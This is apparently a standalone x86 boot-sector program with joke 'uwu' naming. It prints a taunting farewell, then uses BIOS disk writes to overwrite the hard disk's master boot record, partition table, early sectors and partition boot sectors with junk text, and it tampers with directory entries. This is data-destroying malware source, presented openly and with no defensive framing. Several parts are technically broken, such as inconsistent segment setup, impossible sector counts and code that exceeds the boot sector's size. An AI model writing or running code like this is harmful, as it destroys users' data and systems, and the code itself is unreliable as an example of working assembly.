[org 0x7C00]

ikuyooo:
    mov ax, 0x07C0
    mov ds, ax
    mov es, ax
    mov fs, ax
    mov gs, ax
    mov ss, ax

    mov si, sayonara_tehehe
    call print_uwu

    call uwu_payload

    jmp halt

print_uwu:
    mov ah, 0x0E
    mov al, [si]
    int 0x10
    inc si
    cmp al, 0x00
    jne print_uwu
    ret

uwu_payload:

    mov si, uwu_key
    mov cx, 5
OwO_circle:
    lodsb
    xor [si-1], al
    loop OwO_circle

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    int 0x13

    mov si, 0x1BE
    mov cx, 4
uwu_circle:
    mov di, 0x7C00
    mov dx, [si]
    add dx, [si+2]
    cmp dx, 0x0000
    je tired_oWo
    mov ah, 0x03
    mov al, 0x01
    mov ch, [si+1]
    mov cl, [si+2]
    mov dh, [si+3]
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512
    rep movsb
tired_oWo:
    add si, 16
    loop uwu_circle

    mov si, uwu_uwu
    mov di, 0x1BE
    mov cx, 64
    rep movsb

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0xFF
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512 * 255
    rep movsb

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x02
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512
    rep movsb

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x03
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512
    rep movsb

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x04
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512
    rep movsb

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x03
    mov al, 0x01
    mov ch, 0x00
    mov cl, 0x05
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512
    rep movsb

    mov si, 0x1BE
    mov cx, 4
oya_oya_OwO:
    mov di, 0x7C00
    mov dx, [si]
    add dx, [si+2]
    cmp dx, 0x0000
    je tehehe_UwU
    mov ah, 0x03
    mov al, 0x01
    mov ch, [si+1]
    mov cl, [si+2]
    mov dh, [si+3]
    mov dl, 0x80
    int 0x13
    mov si, Ayaya_OwO
    mov di, 0x7C00 + 44
    mov cx, 11
    rep movsb
tehehe_UwU:
    add si, 16
    loop oya_oya_OwO

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 0x20
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, uwu_uwu
    mov di, 0x7C00
    mov cx, 512 * 32
    rep movsb

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 0x20
    mov ch, 0x00
    mov cl, 0x01
    mov dh, 0x00
    mov dl, 0x80
    int 0x13
    mov si, 0x7C00
    mov di, 0x7E00
    mov cx, 512 * 32
    rep movsb

    mov si, 0x7E00
    mov cx, 512 * 32 / 32
etooo_ne_bleeh:
    mov di, si
    add di, 0x1C
    mov al, [di]
    cmp al, 0x00
    je next_file
    mov [di], 'u'
    inc di
    mov [di], 'w'
    inc di
    mov [di], 'u'
    next_file:
    add si, 32
    loop etooo_ne_bleeh

    ret

sayonara_tehehe:
    db 'Uwu Uwu bye bye! Tehehe...', 0x0A, 0x00

uwu_uwu:
    db 'UwU I got ya!', 0x00

Ayaya_OwO:
    db 'UwU', 0x00

uwu_key:
    db 'UwUo', 'OwOo', 'UwUo', 'OwOo', 'UwUo' 

times 510 - ($ - ikuyooo) db 0
dw 0xAA55
